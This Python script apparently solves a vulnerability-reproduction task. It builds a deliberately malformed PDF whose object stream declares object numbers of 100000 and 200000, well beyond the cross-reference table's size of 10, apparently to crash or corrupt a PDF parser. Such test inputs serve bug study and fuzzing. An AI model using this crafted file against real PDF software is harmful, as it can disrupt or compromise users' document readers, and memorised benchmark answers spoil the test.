import struct
from typing import Dict, List


class Solution:
    def solve(self, src_path: str) -> bytes:
        def make_dict(entries: List[str]) -> bytes:
            return b"<< " + b" ".join(e.encode("ascii") for e in entries) + b" >>"

        def make_obj(num: int, inner: bytes) -> bytes:
            return f"{num} 0 obj\n".encode("ascii") + inner + b"\nendobj\n"

        def make_stream_obj(num: int, dict_entries: List[str], data: bytes) -> bytes:
            d = make_dict(dict_entries + [f"/Length {len(data)}"])
            inner = d + b"\nstream\n" + data + b"\nendstream"
            return make_obj(num, inner)

        def xref_entry(t: int, a: int, b: int, w1: int = 1, w2: int = 4, w3: int = 2) -> bytes:
            return (
                int(t).to_bytes(w1, "big", signed=False)
                + int(a).to_bytes(w2, "big", signed=False)
                + int(b).to_bytes(w3, "big", signed=False)
            )

        big1 = 100000
        big2 = 200000

        page_obj = b"<< /Type /Page /Parent 2 0 R /Resources << >> /MediaBox [0 0 612 792] /Contents 6 0 R >>"
        nul = b"null"
        body_section = page_obj + b"\n" + nul + b"\n" + nul
        off2 = len(page_obj) + 1
        off3 = len(page_obj) + 1 + len(nul) + 1
        header = f"4 0 {big1} {off2} {big2} {off3}\n".encode("ascii")
        objstm_data = header + body_section
        first = len(header)

        pdf = bytearray()
        pdf += b"%PDF-1.5\n%\xFF\xFF\xFF\xFF\n"

        offsets: Dict[int, int] = {}

        def append_obj(num: int, obj_bytes: bytes) -> None:
            offsets[num] = len(pdf)
            pdf.extend(obj_bytes)

        obj1 = make_obj(1, make_dict(["/Type /Catalog", "/Pages 2 0 R"]))
        obj2 = make_obj(2, make_dict(["/Type /Pages", "/Kids [4 0 R]", "/Count 1"]))
        obj3 = make_stream_obj(3, ["/Type /ObjStm", "/N 3", f"/First {first}"], objstm_data)
        obj6 = make_stream_obj(6, [], b"")

        append_obj(1, obj1)
        append_obj(2, obj2)
        append_obj(3, obj3)
        append_obj(6, obj6)

        offset5 = len(pdf)

        size = 10
        entries = []
        entries.append(xref_entry(0, 0, 65535))
        entries.append(xref_entry(1, offsets[1], 0))
        entries.append(xref_entry(1, offsets[2], 0))
        entries.append(xref_entry(1, offsets[3], 0))
        entries.append(xref_entry(2, 3, 0))
        entries.append(xref_entry(1, offset5, 0))
        entries.append(xref_entry(1, offsets[6], 0))
        for _ in range(7, size):
            entries.append(xref_entry(0, 0, 0))
        xref_data = b"".join(entries)

        obj5 = make_stream_obj(
            5,
            [
                "/Type /XRef",
                f"/Size {size}",
                "/W [1 4 2]",
                f"/Index [0 {size}]",
                "/Root 1 0 R",
            ],
            xref_data,
        )
        append_obj(5, obj5)

        pdf += b"startxref\n" + str(offset5).encode("ascii") + b"\n%%EOF\n"
        return bytes(pdf)